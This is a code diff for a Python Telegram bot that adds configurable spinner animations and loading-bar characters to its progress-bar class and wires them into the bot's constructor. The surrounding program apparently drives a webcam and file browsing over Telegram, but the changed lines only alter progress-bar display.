@@ -401,8 +401,29 @@ class AsciiAnimation(EditableMessage):
                 self.edit(frame)
                 sleep(0.5)
 
+all_spinners = {
+    "slash": ["|", "/", "-", "\\"],
+    "double_bar": ["-", "=", "~", "-"],
+    "dot_wave": [".  ", ".. ", "...", " ..", "  .", "   "],
+    "line_bounce": ["_", "‾"],
+    "dots_3": ["⠁", "⠂", "⠄", "⠂"],
+    "quarter": ["◴", "◷", "◶", "◵"],
+    "half_moon": ["◐", "◓", "◑", "◒"],
+    "block_corner": ["▖", "▘", "▝", "▗"],
+    "clock": ["🕛", "🕐", "🕑", "🕒", "🕓", "🕔", "🕕", "🕖", "🕗", "🕘", "🕙", "🕚"],
+    "arrow": ["←", "↖", "↑", "↗", "→", "↘", "↓", "↙"],
+    "double_arrow": ["⇐", "⇑", "⇒", "⇓"],
+    "braille": ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"],
+    "colored_blocks": ["🟥⬜⬜", "🟩🟥⬜", "⬜🟩🟥", "⬜⬜🟩", "⬜⬜⬜"],
+    "bouncing_bar": ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█", "▇", "▆", "▅", "▄", "▃", "▂", "▁"],
+    "pixel": ["⡀", "⠄", "⠂", "⠁", "⠈", "⠐", "⠠", "⢀"],
+    "circle_dots": ["◜", "◠", "◝", "◞", "◡", "◟"],
+    "gear": ["⚙️", "⚙️", "⚙️", "⚙️"],  # static gear, or rotate manually
+    "signal": ["▂", "▄", "▆", "▇", "█", "▇", "▆", "▄"]
+}
+
 class LoadingBar:
-    def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True, label=None):
+    def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True, label=None, spinner_enabled: bool=True, full_char: str="🔲", empty_char="🔶", spinner_frames=all_spinners["braille"], spinner_pos: str="left"):
         self.bot = bot
         self.tot = total
         self.label = label
@@ -410,8 +431,16 @@ class LoadingBar:
         self.showperc = showperc
         self.autodelete = autodelete
 
-        self.full_char = "🔲"
-        self.empty_char = "🔶"
+
+        self.spinner = spinner_frames
+        self.spinner_index = 0
+        self.spinner_enabled = spinner_enabled
+        self.spinner_delay = 0.2
+        self.spinner_pos = spinner_pos
+
+        self.full_char = full_char
+        self.empty_char = empty_char
+
         self.progress = 0
         self.done = False
         self.deleted = False
@@ -425,11 +454,24 @@ class LoadingBar:
     def get_bar(self):
         self.perc_progress = round((self.progress / self.tot) * 100, 1)
         self.int_perc_progress = int(self.perc_progress)
-        bar = "🔲" * (self.int_perc_progress//self.bar_lenght) + ("🔶" * ((self.bar_lenght - (self.int_perc_progress//self.bar_lenght))))
+        bar = self.full_char * (self.int_perc_progress//self.bar_lenght) + (self.empty_char * ((self.bar_lenght - (self.int_perc_progress//self.bar_lenght))))
         bar = f"{bar}" + (f"{self.perc_progress}%" if self.showperc else "")
         if self.label:
             bar = f"{self.label}\n{bar}"
+        if self.spinner_enabled:
+            bar = f"{self.spinner[self.spinner_index]}{bar}" if self.spinner_pos == "left" else f"{bar}{self.spinner[self.spinner_index]}"
         return bar
+
+    def spinner_cycle(self):
+        while self.perc_progress < 100:
+            print(self.perc_progress)
+            new_bar = self.get_bar()
+            self.ETDMessage.edit(new_bar)
+            if self.spinner_index == len(self.spinner)-1:
+                self.spinner_index = 0
+            else:
+                self.spinner_index += 1
+            sleep(self.spinner_delay)
 
     def prep_animation(self, repeat: int = 2, progress: int = 25) -> None:
         for i in range(repeat):
@@ -452,6 +494,9 @@ class LoadingBar:
     def setup(self):
         bar = self.get_bar()
         self.ETDMessage = EditableMessage(self.bot, self.chat_id, bar)
+        if self.spinner_enabled:
+            t = Thread(target=self.spinner_cycle)
+            t.start()
 
     def set_progress(self, progress: int) -> None:
         self.progress = progress
@@ -532,13 +577,16 @@ o888o  o888o  `Y8bood8P'  o888o        `Y8bod8P'  888bod8P'
                                                  o888o
 """
 class PeppinoTelegram:
-    def __init__(self, token: str, owner_id: int, mixer: CustomMixer, capture: VideoCapture) -> None:
+    def __init__(self, token: str, owner_id: int, mixer: CustomMixer, capture: VideoCapture, loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]]) -> None:
         self.token = token
+        self.owner_id = owner_id
+        self.loading_bar_set = loading_bar_set
+        self.loading_bar_spinner = loading_bar_spinner
+
         self.help = HELP
         self.page = 0
         self.owner_name = ""
         self.bot = Bot(token) 
-        self.owner_id = owner_id
         self.duckyhelp = DUCKYHELP
         self.explorer_path = getcwd()
         self.audio_mixer = mixer
@@ -611,8 +659,8 @@ class PeppinoTelegram:
     def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
         return EditableMessage(self.bot, self.owner_id, content, autosend)
     
-    def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=True, label=None) -> LoadingBar:
-        return LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label)
+    def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar:
+        return LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right") 
     
     def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
         return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)
@@ -1200,5 +1248,5 @@ if __name__ == "__main__":
     token, chat_id = getCred() 
     mixer = CustomMixer()
     capture = VideoCapture(0)
-    pep2 = PeppinoTelegram(token,chat_id,mixer,capture)
+    pep2 = PeppinoTelegram(token,chat_id,mixer,capture,loading_bar_spinner=all_spinners["circle_dots"])
     pep2.start()
